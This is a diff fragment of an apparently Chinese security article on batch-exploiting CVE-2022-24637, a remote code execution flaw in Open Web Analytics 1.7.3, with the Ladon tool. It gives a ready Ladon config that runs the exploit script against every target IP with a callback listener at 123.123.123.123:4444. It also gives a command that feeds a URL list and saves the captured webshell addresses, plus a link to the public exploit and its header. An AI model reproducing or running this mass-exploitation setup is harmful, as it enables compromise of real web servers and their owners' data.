@@ -39,20 +39,20 @@ Ladon url.txt cve-2022-24637
 ```
 [Ladon]
 exe=python
-arg=CVE-2022-24637.py $ip$ -i 123.123.123.123 -p 4444 -u admin
+arg=CVE-2022-24637.py $ip$ -i 123.123.123.123 -p 4444 -u admin
 log=true
 ```  
   
 webshell是随机地址，我们可以重定向输出结果  
 ```
-Ladon url.txt GetShell.ini > shell.txt
+Ladon url.txt GetShell.ini > shell.txt
 ```  
   
   
 PS: 与Ladon联动的最佳Poc为.net编写的程序或DLL，可使用LadonEXP一键生成大部份WEB相关POC，非WEB洞需自己编写。  
   
   
-PoC地址: https://www.exploit-db.com/exploits/51026  
+PoC地址: https://www.exploit-db.com/exploits/51026  
 ```
 # Exploit Title: Open Web Analytics 1.7.3 - Remote Code Execution (RCE)
 # Date: 2022-08-30
@@ -309,7 +309,7 @@ else:
 **侵权请私聊公众号删文**  
   
   
- **热文推荐******  
+ **热文推荐******  
   
 - [蓝队应急响应姿势之Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  
   
